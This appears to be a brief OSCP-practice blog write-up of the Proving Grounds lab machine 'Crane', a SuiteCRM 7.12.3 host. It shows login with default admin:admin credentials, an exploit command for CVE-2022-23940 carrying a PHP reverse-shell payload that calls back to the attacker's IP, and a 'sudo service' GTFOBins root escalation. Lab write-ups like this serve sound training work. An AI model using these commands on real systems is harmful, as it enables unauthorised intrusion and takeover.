---
layout: post
title:  "Write Up: Proving Grounds Practice - Crane"
date:   2024-07-29 20:05:23 -0400
categories: oscp proving-grounds TJNull
---

192.168.194.146
me - 192.168.45.213

Hitting the site in a web browser I was able to log in using admin:admin and from there I was able to find an about page that has the version information for SuiteCRM

http://192.168.194.146/index.php?module=Home&action=index
admin : admin

Version 7.12.3

Sugar Version 6.5.25 (Build 344)

SuiteCRM - Open source CRM for the world


Doing a little digging online it looks like there is an exploit I can use for this here: https://medium.com/@_crac/cve-2022-23940-rce-in-suitecrm-90df53980d8c

POC - https://github.com/manuelz120/CVE-2022-23940

python3 exploit.py -h http://192.168.194.146 -u admin -p admin --payload "php -r '\$sock=fsockopen(\"192.168.45.213\", 4444); exec(\"/bin/sh -i <&3 >&3 2>&3\");'"


got reverse shell

/var/www/local.txt
=======================================================================================================================



https://gtfobins.github.io/gtfobins/service/



    sudo service ../../bin/sh
